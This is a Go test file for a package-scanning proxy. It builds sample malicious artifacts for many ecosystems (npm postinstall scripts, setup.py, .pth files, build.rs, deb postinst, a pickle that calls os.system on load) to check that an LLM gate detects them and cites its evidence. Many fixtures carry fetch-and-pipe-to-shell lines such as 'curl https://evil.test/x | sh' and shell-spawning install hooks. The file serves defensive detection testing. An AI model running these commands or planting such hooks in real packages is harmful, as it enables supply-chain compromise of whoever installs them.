package llmpkgscan

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"context"
	"encoding/binary"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/klauspost/compress/zstd"

	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan/pkgscantest"
)

// One artifact per ecosystem the proxy fronts, in the format that ecosystem
// really ships, each carrying something to find in the place that ecosystem
// executes at install or load time. The test drives the whole gate over each:
// unpack, rank, prompt, verdict, and the proxy's own check that the evidence the
// model cited is in the file it cited.
//
// It is the per-format half of "the gate covers every ecosystem" (the per-path
// half is the backends' artifact classification). The OS-package and Nix
// formats use fixtures written by the real tools (dpkg-deb, rpmbuild,
// nix-store; see internal/contentscan/testdata/formats/src/generate.sh): an
// unpacker tested only against archives built by its own author has been tested
// against one opinion of the format.

// formatFixture reads a real-tool fixture from the shared unpack layer's
// testdata.
func formatFixture(t *testing.T, name string) []byte {
	t.Helper()
	data, err := os.ReadFile(filepath.Join("..", "contentscan", "testdata", "formats", name))
	if err != nil {
		t.Fatalf("reading fixture: %v", err)
	}
	return data
}

// marked returns text carrying the needle the mock model keys on.
func marked(prefix string) string {
	return prefix + " # " + pkgscantest.MaliciousMarker + "\n"
}

// plainTar builds an uncompressed tar, members in the given order.
func plainTar(members ...layerFile) []byte {
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for _, f := range members {
		mode := f.mode
		if mode == 0 {
			mode = 0o644
		}
		_ = tw.WriteHeader(&tar.Header{Name: f.name, Mode: mode, Size: int64(len(f.data)), Typeflag: tar.TypeReg})
		_, _ = io.WriteString(tw, f.data)
	}
	_ = tw.Close()
	return buf.Bytes()
}

func gz(data []byte) string {
	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	_, _ = w.Write(data)
	_ = w.Close()
	return buf.String()
}

func zst(t *testing.T, data []byte) string {
	t.Helper()
	enc, err := zstd.NewWriter(nil)
	if err != nil {
		t.Fatal(err)
	}
	defer enc.Close()
	return string(enc.EncodeAll(data, nil))
}

// storedZip builds a zip whose members are stored in the given order.
func storedZip(members ...layerFile) []byte {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, f := range members {
		w, _ := zw.Create(f.name)
		_, _ = io.WriteString(w, f.data)
	}
	_ = zw.Close()
	return buf.Bytes()
}

// elfWith is a minimal ELF64 x86-64 shared object header followed by a string
// table holding the given strings: what a native extension, a provider plugin
// or a bottle's binary looks like to the strings view.
func elfWith(stringsIn ...string) string {
	h := make([]byte, 64)
	copy(h, "\x7fELF")
	h[4], h[5], h[6] = 2, 1, 1                  // 64-bit, little-endian, version 1
	binary.LittleEndian.PutUint16(h[16:], 3)    // ET_DYN
	binary.LittleEndian.PutUint16(h[18:], 0x3e) // x86-64
	var b bytes.Buffer
	b.Write(h)
	b.Write(bytes.Repeat([]byte{0x00, 0x01, 0xfe, 0x90}, 64))
	for _, s := range stringsIn {
		b.WriteString(s)
		b.WriteByte(0)
	}
	b.Write(bytes.Repeat([]byte{0xcc, 0x00, 0x7f, 0x81}, 64))
	return b.String()
}

// javaClassWith is a JVM class file header followed by a constant holding s.
func javaClassWith(s string) string {
	var b bytes.Buffer
	b.Write([]byte{0xca, 0xfe, 0xba, 0xbe, 0x00, 0x00, 0x00, 0x3d, 0x00, 0x10})
	b.WriteByte(1) // CONSTANT_Utf8
	_ = binary.Write(&b, binary.BigEndian, uint16(len(s)))
	b.WriteString(s)
	b.Write(bytes.Repeat([]byte{0x00, 0x07, 0xb1, 0x2a}, 32))
	return b.String()
}

// osSystemPickle is a protocol-2 pickle that calls os.system on load: the
// payload of a booby-trapped model checkpoint.
func osSystemPickle(command string) []byte {
	var b bytes.Buffer
	b.WriteString("\x80\x02cos\nsystem\n")
	b.WriteByte('X') // BINUNICODE
	_ = binary.Write(&b, binary.LittleEndian, uint32(len(command)))
	b.WriteString(command)
	b.WriteString("\x85R.") // TUPLE1 REDUCE STOP
	return b.Bytes()
}

type ecosystemFormat struct {
	ecosystem string
	what      string
	filename  string
	artifact  func(t *testing.T) []byte
	// single marks a payload its backend serves as one file (backends.KindFile).
	single bool
	// unclassified serves it without a classification: examined because of what
	// its bytes are.
	unclassified bool
	format       string
	// needle overrides the marker the mock model keys on (for real-tool fixtures,
	// which do not carry the marker); evidence is the tree path it must be cited
	// at, and role a substring of the reason that file is ranked for.
	needle   string
	evidence string
	role     string
}

func ecosystemFormats() []ecosystemFormat {
	tgz := func(files map[string]string) func(*testing.T) []byte {
		return func(*testing.T) []byte { return pkgscantest.TarGz(files) }
	}
	zipOf := func(files map[string]string) func(*testing.T) []byte {
		return func(*testing.T) []byte { return pkgscantest.Zip(files) }
	}
	raw := func(s string) func(*testing.T) []byte { return func(*testing.T) []byte { return []byte(s) } }
	fixture := func(name string) func(*testing.T) []byte {
		return func(t *testing.T) []byte { return formatFixture(t, name) }
	}

	return []ecosystemFormat{
		{ecosystem: "npm", what: "package tarball", filename: "evil-1.0.0.tgz", format: "tar.gz", evidence: "package/scripts/setup.js",
			artifact: func(*testing.T) []byte {
				return pkgscantest.NpmTarball("evil", "1.0.0", map[string]string{"postinstall": "node scripts/setup.js"},
					map[string]string{"scripts/setup.js": marked("require('child_process').exec('id');")})
			}},
		{ecosystem: "pip", what: "sdist", filename: "evil-1.0.tar.gz", format: "tar.gz", evidence: "evil-1.0/setup.py", role: "install",
			artifact: tgz(map[string]string{"evil-1.0/setup.py": marked("import os; os.system('id')"), "evil-1.0/PKG-INFO": "Name: evil\n"})},
		{ecosystem: "pip", what: "wheel", filename: "evil-1.0-py3-none-any.whl", format: "zip", evidence: "evil.pth",
			artifact: zipOf(map[string]string{
				"evil/__init__.py":             "VERSION = '1.0'\n",
				"evil.pth":                     marked("import os; os.system('id')"),
				"evil-1.0.dist-info/METADATA":  "Name: evil\nVersion: 1.0\n",
				"evil-1.0.dist-info/WHEEL":     "Wheel-Version: 1.0\n",
				"evil-1.0.dist-info/RECORD":    "evil/__init__.py,,\n",
				"evil-1.0.dist-info/top_level": "evil\n",
			})},
		{ecosystem: "cargo", what: ".crate", filename: "evil-1.0.0.crate", format: "tar.gz", evidence: "evil-1.0.0/build.rs", role: "build",
			artifact: tgz(map[string]string{"evil-1.0.0/Cargo.toml": "[package]\nname = \"evil\"\nbuild = \"build.rs\"\n", "evil-1.0.0/build.rs": marked("fn main() { std::process::Command::new(\"sh\"); }"), "evil-1.0.0/src/lib.rs": "pub fn f() {}\n"})},
		{ecosystem: "go", what: "module zip", filename: "v1.0.0.zip", format: "zip", evidence: "example.com/evil@v1.0.0/init.go",
			artifact: zipOf(map[string]string{"example.com/evil@v1.0.0/go.mod": "module example.com/evil\n", "example.com/evil@v1.0.0/init.go": marked("package evil\nfunc init() { exec.Command(\"sh\").Run() }")})},
		{ecosystem: "nuget", what: ".nupkg", filename: "evil.1.0.0.nupkg", format: "zip", evidence: "tools/install.ps1", role: "install",
			artifact: zipOf(map[string]string{"evil.nuspec": "<package><metadata><id>evil</id></metadata></package>\n", "tools/install.ps1": marked("iex (iwr https://evil.test/x)"), "lib/net8.0/evil.dll": "MZ\x90\x00binary"})},
		{ecosystem: "maven", what: "jar (bytecode, shown as strings)", filename: "evil-1.0.jar", format: "zip", evidence: "com/evil/Loader.class",
			artifact: zipOf(map[string]string{"META-INF/MANIFEST.MF": "Manifest-Version: 1.0\nMain-Class: com.evil.Loader\n", "com/evil/Loader.class": javaClassWith("https://evil.test/stage2 " + pkgscantest.MaliciousMarker)})},
		{ecosystem: "maven", what: "POM served as a single file", filename: "evil-1.0.pom", single: true, format: "file", evidence: "evil-1.0.pom",
			artifact: raw("<project>\n<build><plugins><plugin><artifactId>exec-maven-plugin</artifactId>\n<!-- " + pkgscantest.MaliciousMarker + " -->\n</plugin></plugins></build>\n</project>\n")},
		{ecosystem: "rubygems", what: ".gem (tar holding data.tar.gz)", filename: "evil-1.0.0.gem", format: "tar", evidence: "ext/evil/extconf.rb", role: "extension",
			artifact: func(*testing.T) []byte {
				data := pkgscantest.TarGz(map[string]string{"lib/evil.rb": "module Evil; end\n", "ext/evil/extconf.rb": marked("system('id')")})
				return plainTar(
					layerFile{name: "metadata.gz", data: gz([]byte("--- !ruby/object:Gem::Specification\nname: evil\nextensions:\n- ext/evil/extconf.rb\n"))},
					layerFile{name: "data.tar.gz", data: string(data)},
					layerFile{name: "checksums.yaml.gz", data: gz([]byte("---\nSHA256: {}\n"))},
				)
			}},
		{ecosystem: "composer", what: "dist zip", filename: "evil-1.0.0.zip", format: "zip", evidence: "vendor-evil-abc123/install.php",
			artifact: zipOf(map[string]string{"vendor-evil-abc123/composer.json": "{\"name\":\"vendor/evil\",\"scripts\":{\"post-install-cmd\":\"php install.php\"}}\n", "vendor-evil-abc123/install.php": marked("<?php system('id');")})},
		{ecosystem: "helm", what: "chart .tgz", filename: "evil-1.0.0.tgz", format: "tar.gz", evidence: "evil/templates/hook.yaml",
			artifact: tgz(map[string]string{"evil/Chart.yaml": "apiVersion: v2\nname: evil\nversion: 1.0.0\n", "evil/templates/hook.yaml": marked("kind: Job\nmetadata:\n  annotations:\n    helm.sh/hook: pre-install")})},
		{ecosystem: "terraform", what: "provider zip (native binary, shown as strings)", filename: "terraform-provider-evil_1.0.0_linux_amd64.zip", format: "zip", evidence: "terraform-provider-evil_v1.0.0",
			artifact: zipOf(map[string]string{"terraform-provider-evil_v1.0.0": elfWith("curl -s https://evil.test/x | sh "+pkgscantest.MaliciousMarker, "plugin.Serve")})},
		{ecosystem: "terraform", what: "module archive", filename: "module.tar.gz", format: "tar.gz", evidence: "main.tf",
			artifact: tgz(map[string]string{"main.tf": marked("resource \"null_resource\" \"x\" {\n  provisioner \"local-exec\" { command = \"curl https://evil.test | sh\" }\n}"), "variables.tf": "variable \"x\" {}\n"})},
		{ecosystem: "apt", what: ".deb written by dpkg-deb (ar, control.tar.xz, data.tar.xz)", filename: "pthello_1.2.3-4_all.deb", format: "deb",
			artifact: fixture("pthello-xz.deb"), needle: "curl -fsSL http://example.invalid/x | sh", evidence: "DEBIAN/postinst", role: "root"},
		{ecosystem: "apt", what: ".deb with zstd members", filename: "pthello_1.2.3-4_all.deb", format: "deb",
			artifact: fixture("pthello-zstd.deb"), needle: "curl -fsSL http://example.invalid/x | sh", evidence: "DEBIAN/postinst"},
		{ecosystem: "yum", what: ".rpm written by rpmbuild (scriptlets in the header, zstd cpio payload)", filename: "pthello-1.2.3-4.noarch.rpm", format: "rpm",
			artifact: fixture("pthello-zstd.rpm"), needle: "curl -fsSL http://example.invalid/x | sh", evidence: "RPM/scriptlets/postin", role: "root"},
		{ecosystem: "yum", what: ".rpm in the RPM 6 format (stripped cpio payload)", filename: "pthello-1.2.3-4.noarch.rpm", format: "rpm",
			artifact: fixture("pthello-v6.rpm"), needle: "trigger-marker", evidence: "RPM/triggers/0"},
		{ecosystem: "conda", what: ".tar.bz2 package", filename: "hello-1.0-0.tar.bz2", format: "tar.bz2",
			artifact: fixture("hello.tar.bz2"), needle: "echo hello from cpio", evidence: "hello/bin/hello"},
		{ecosystem: "conda", what: ".conda package (zip holding info-*.tar.zst and pkg-*.tar.zst)", filename: "evil-1.0-0.conda", format: "zip", evidence: "bin/.evil-post-link.sh", role: "install",
			artifact: func(t *testing.T) []byte {
				info := plainTar(layerFile{name: "info/index.json", data: "{\"name\":\"evil\",\"version\":\"1.0\"}\n"})
				pkg := plainTar(layerFile{name: "bin/.evil-post-link.sh", data: marked("#!/bin/sh\ncurl https://evil.test/x | sh"), mode: 0o755}, layerFile{name: "lib/evil.txt", data: "x\n"})
				return storedZip(
					layerFile{name: "metadata.json", data: "{\"conda_pkg_format_version\": 2}\n"},
					layerFile{name: "info-evil-1.0-0.tar.zst", data: zst(t, info)},
					layerFile{name: "pkg-evil-1.0-0.tar.zst", data: zst(t, pkg)},
				)
			}},
		{ecosystem: "cran", what: "source tarball", filename: "evil_1.0.tar.gz", format: "tar.gz", evidence: "evil/configure", role: "configur",
			artifact: tgz(map[string]string{"evil/DESCRIPTION": "Package: evil\nVersion: 1.0\n", "evil/configure": marked("#!/bin/sh\ncurl https://evil.test/x | sh"), "evil/R/evil.R": "f <- function() 1\n"})},
		{ecosystem: "cpan", what: "distribution tarball", filename: "Evil-1.0.tar.gz", format: "tar.gz", evidence: "Evil-1.0/Makefile.PL", role: "install",
			artifact: tgz(map[string]string{"Evil-1.0/Makefile.PL": marked("use ExtUtils::MakeMaker; system('id');"), "Evil-1.0/lib/Evil.pm": "package Evil; 1;\n"})},
		{ecosystem: "hackage", what: "source tarball", filename: "evil-1.0.tar.gz", format: "tar.gz", evidence: "evil-1.0/Setup.hs", role: "build",
			artifact: tgz(map[string]string{"evil-1.0/evil.cabal": "name: evil\nversion: 1.0\nbuild-type: Custom\n", "evil-1.0/Setup.hs": marked("import System.Process\nmain = callCommand \"id\"")})},
		{ecosystem: "hex", what: "package tarball (holding contents.tar.gz)", filename: "evil-1.0.0.tar", format: "tar", evidence: "mix.exs", role: "evaluated",
			artifact: func(*testing.T) []byte {
				contents := pkgscantest.TarGz(map[string]string{"mix.exs": marked("defmodule Evil.MixProject do\n  System.cmd(\"sh\", [\"-c\", \"id\"])\nend"), "lib/evil.ex": "defmodule Evil do\nend\n"})
				return plainTar(
					layerFile{name: "VERSION", data: "3"},
					layerFile{name: "metadata.config", data: "{<<\"name\">>,<<\"evil\">>}.\n"},
					layerFile{name: "contents.tar.gz", data: string(contents)},
					layerFile{name: "CHECKSUM", data: strings.Repeat("A", 64)},
				)
			}},
		{ecosystem: "dart", what: "pub archive", filename: "evil-1.0.0.tar.gz", format: "tar.gz", evidence: "hook/build.dart",
			artifact: tgz(map[string]string{"pubspec.yaml": "name: evil\nversion: 1.0.0\n", "hook/build.dart": marked("import 'dart:io';\nvoid main() { Process.run('sh', ['-c', 'id']); }"), "lib/evil.dart": "int f() => 1;\n"})},
		{ecosystem: "swift", what: "source archive", filename: "evil-1.0.0.zip", format: "zip", evidence: "evil/Package.swift", role: "executed",
			artifact: zipOf(map[string]string{"evil/Package.swift": marked("// swift-tools-version:5.9\nimport PackageDescription\nimport Foundation\nlet p = Process()"), "evil/Sources/evil/evil.swift": "public func f() {}\n"})},
		{ecosystem: "swift", what: "Package.swift served as a single file", filename: "Package.swift", single: true, format: "file", evidence: "Package.swift",
			artifact: raw(marked("// swift-tools-version:5.9\nimport PackageDescription\nimport Foundation\nlet p = Process()"))},
		{ecosystem: "jsr", what: "module file served singly", filename: "mod.ts", single: true, format: "file", evidence: "mod.ts",
			artifact: raw(marked("export const run = () => new Deno.Command('sh', { args: ['-c', 'id'] }).spawn();"))},
		{ecosystem: "conan", what: "recipe export tarball", filename: "conan_export.tgz", format: "tar.gz", evidence: "conanfile.py",
			artifact: tgz(map[string]string{"conanfile.py": marked("from conan import ConanFile\nimport os\nos.system('id')"), "conandata.yml": "sources: {}\n"})},
		{ecosystem: "conan", what: "conanfile.py served as a single file", filename: "conanfile.py", single: true, format: "file", evidence: "conanfile.py",
			artifact: raw(marked("from conan import ConanFile\nimport os\nos.system('id')"))},
		{ecosystem: "bazel", what: "source archive", filename: "evil-1.0.tar.gz", format: "tar.gz", evidence: "evil-1.0/defs.bzl",
			artifact: tgz(map[string]string{"evil-1.0/MODULE.bazel": "module(name = \"evil\", version = \"1.0\")\n", "evil-1.0/defs.bzl": marked("def _impl(ctx):\n    ctx.execute([\"sh\", \"-c\", \"id\"])")})},
		{ecosystem: "bazel", what: "MODULE.bazel served as a single file", filename: "MODULE.bazel", single: true, format: "file", evidence: "MODULE.bazel",
			artifact: raw(marked("module(name = \"evil\", version = \"1.0\")\nuse_repo_rule(\"@evil//:defs.bzl\", \"run\")"))},
		{ecosystem: "julia", what: "package tarball", filename: "evil.tar.gz", format: "tar.gz", evidence: "deps/build.jl", role: "build",
			artifact: tgz(map[string]string{"Project.toml": "name = \"Evil\"\n", "deps/build.jl": marked("run(`sh -c id`)"), "src/Evil.jl": "module Evil end\n"})},
		{ecosystem: "openvsx", what: ".vsix", filename: "evil-1.0.0.vsix", format: "zip", evidence: "extension/out/extension.js",
			artifact: zipOf(map[string]string{"extension.vsixmanifest": "<PackageManifest/>\n", "extension/package.json": "{\"name\":\"evil\",\"main\":\"./out/extension.js\",\"activationEvents\":[\"*\"]}\n", "extension/out/extension.js": marked("require('child_process').exec('id');")})},
		{ecosystem: "nix", what: "NAR written by nix-store, xz-compressed", filename: "1b9p07z77phvv2hf6gm9f28syp39f1ag-hello.nar.xz", format: "nar.xz",
			artifact: fixture("hello.nar.xz"), needle: "echo hello", evidence: "bin/hello"},
		{ecosystem: "homebrew", what: "bottle (native binary, shown as strings)", filename: "evil--1.0.x86_64_linux.bottle.tar.gz", format: "tar.gz", evidence: "evil/1.0/bin/evil",
			artifact: func(*testing.T) []byte {
				var buf bytes.Buffer
				gw := gzip.NewWriter(&buf)
				tw := tar.NewWriter(gw)
				bin := elfWith("/bin/sh -c curl https://evil.test/x "+pkgscantest.MaliciousMarker, "libc.so.6")
				_ = tw.WriteHeader(&tar.Header{Name: "evil/1.0/bin/evil", Mode: 0o755, Size: int64(len(bin)), Typeflag: tar.TypeReg})
				_, _ = io.WriteString(tw, bin)
				rb := "class Evil < Formula\nend\n"
				_ = tw.WriteHeader(&tar.Header{Name: "evil/1.0/.brew/evil.rb", Mode: 0o644, Size: int64(len(rb)), Typeflag: tar.TypeReg})
				_, _ = io.WriteString(tw, rb)
				_ = tw.Close()
				_ = gw.Close()
				return buf.Bytes()
			}},
		{ecosystem: "ansible", what: "collection tarball", filename: "evil-collection-1.0.0.tar.gz", format: "tar.gz", evidence: "plugins/modules/evil.py",
			artifact: tgz(map[string]string{"MANIFEST.json": "{\"collection_info\":{\"namespace\":\"evil\",\"name\":\"collection\"}}\n", "plugins/modules/evil.py": marked("import subprocess\nsubprocess.run(['sh', '-c', 'id'])")})},
		{ecosystem: "puppet", what: "module tarball", filename: "evil-module-1.0.0.tar.gz", format: "tar.gz", evidence: "evil-module-1.0.0/manifests/init.pp",
			artifact: tgz(map[string]string{"evil-module-1.0.0/metadata.json": "{\"name\":\"evil-module\"}\n", "evil-module-1.0.0/manifests/init.pp": marked("class evil { exec { 'x': command => '/bin/sh -c id' } }")})},
		{ecosystem: "huggingface", what: "pickle checkpoint (summarized by the proxy)", filename: "pytorch_model.bin", single: true, format: "file", evidence: "pytorch_model.bin",
			artifact: func(*testing.T) []byte { return osSystemPickle("curl https://evil.test/x | sh") }, needle: "os.system"},
		{ecosystem: "huggingface", what: "repository code file", filename: "modeling_evil.py", single: true, format: "file", evidence: "modeling_evil.py",
			artifact: raw(marked("import os\nos.system('id')"))},
		{ecosystem: "generic", what: "installer script on a route the operator gated", filename: "install.sh", single: true, format: "file", evidence: "install.sh",
			artifact: raw(marked("#!/bin/sh\ncurl https://evil.test/x | sh"))},
		{ecosystem: "generic", what: "gzip-compressed installer", filename: "install.sh.gz", single: true, format: "gz",
			artifact: fixture("install.sh.gz"), needle: "single-file-marker", evidence: "install.sh"},
		{ecosystem: EcosystemGitLFS, what: "LFS object that is a native binary", filename: "", unclassified: true, format: "file", evidence: "artifact",
			artifact: raw(elfWith("wget -q https://evil.test/x -O- | sh " + pkgscantest.MaliciousMarker))},
		{ecosystem: EcosystemGitLFS, what: "LFS object that is an archive", filename: "", unclassified: true, format: "zip", evidence: "run.sh",
			artifact: zipOf(map[string]string{"run.sh": marked("#!/bin/sh\ncurl https://evil.test/x | sh"), "data.bin": "\x00\x01\x02"})},
	}
}

func TestEveryEcosystemArtifactFormatIsUnpackedAndJudged(t *testing.T) {
	for _, tc := range ecosystemFormats() {
		t.Run(tc.ecosystem+"/"+tc.what, func(t *testing.T) {
			needle := tc.needle
			if needle == "" {
				needle = pkgscantest.MaliciousMarker
			}
			p := &pkgscantest.Provider{Judge: func(material string) string {
				if !strings.Contains(material, needle) {
					return pkgscantest.BenignVerdict
				}
				path, line, excerpt := pkgscantest.Locate(material, needle)
				return pkgscantest.MaliciousVerdict(path, line, excerpt)
			}}
			svc := newService(t, p, nil)
			artifact := tc.artifact(t)
			req := Request{
				Artifact: Artifact{
					Ecosystem:  tc.ecosystem,
					Name:       "evil",
					Version:    "1.0.0",
					Filename:   tc.filename,
					Digest:     pkgscantest.Digest(artifact),
					Size:       int64(len(artifact)),
					Class:      ClassPayload,
					SingleFile: tc.single,
				},
				Open: pkgscantest.Opener(artifact, nil),
			}
			if tc.unclassified {
				req.Artifact.Class = ClassUnknown
			}
			rep := assess(t, svc, req)
			if !rep.Scanned() {
				t.Fatalf("no verdict: %+v", rep.Unscanned)
			}
			v := rep.Verdict
			if v.Format != tc.format {
				t.Errorf("format = %q, want %q", v.Format, tc.format)
			}
			if rep.Disposition != DispositionMalicious {
				t.Fatalf("disposition = %s; the model was not shown %q.\nMaterial:\n%s", rep.Disposition, needle, p.LastMaterial())
			}
			if len(v.Evidence) == 0 {
				t.Fatal("a malicious verdict without evidence")
			}
			ev := v.Evidence[0]
			if ev.Path != tc.evidence {
				t.Errorf("evidence cited at %q, want %q", ev.Path, tc.evidence)
			}
			if !ev.Verified {
				t.Errorf("the cited evidence (%q line %d: %q) was not confirmed against the unpacked file", ev.Path, ev.Line, ev.Excerpt)
			}
			if v.StructuralRisk {
				t.Errorf("a well-formed %s is flagged as structurally anomalous: %v", tc.what, v.Anomalies)
			}
			if v.Truncated {
				t.Errorf("a small %s is flagged as incompletely examined: %v", tc.what, v.Coverage)
			}
			wantKind := KindArchive
			if singleFormat(tc.format) {
				wantKind = KindFile
			}
			if v.Kind != wantKind {
				t.Errorf("kind = %q, want %q", v.Kind, wantKind)
			}

			if tc.role != "" {
				// The file is not merely present: it is ranked for the reason that
				// makes it worth reading first.
				tree, err := buildTreeOpts(context.Background(), bytes.NewReader(artifact), DefaultLimits(),
					treeOptions{filename: tc.filename, examine: true, single: tc.single})
				if err != nil {
					t.Fatalf("buildTreeOpts: %v", err)
				}
				f, ok := tree.Lookup(tc.evidence)
				if !ok {
					t.Fatalf("%s is not in the tree", tc.evidence)
				}
				if !strings.Contains(strings.ToLower(f.Role), tc.role) {
					t.Errorf("%s is ranked as %q (score %d), want a role mentioning %q", tc.evidence, f.Role, f.Score, tc.role)
				}
			}
		})
	}
}

// Every ecosystem in the gate's default scope has at least one format row
// above: adding an ecosystem to the scope without saying what its artifacts
// look like fails here. (OCI images have their own tests, in image_test.go.)
func TestEveryDefaultEcosystemHasAFormatCase(t *testing.T) {
	covered := map[string]bool{"docker": true}
	for _, tc := range ecosystemFormats() {
		covered[CanonEcosystem(tc.ecosystem)] = true
	}
	for _, eco := range DefaultEcosystems {
		if !covered[eco] {
			t.Errorf("ecosystem %q is scanned by default but has no artifact-format case in ecosystemFormats()", eco)
		}
	}
}
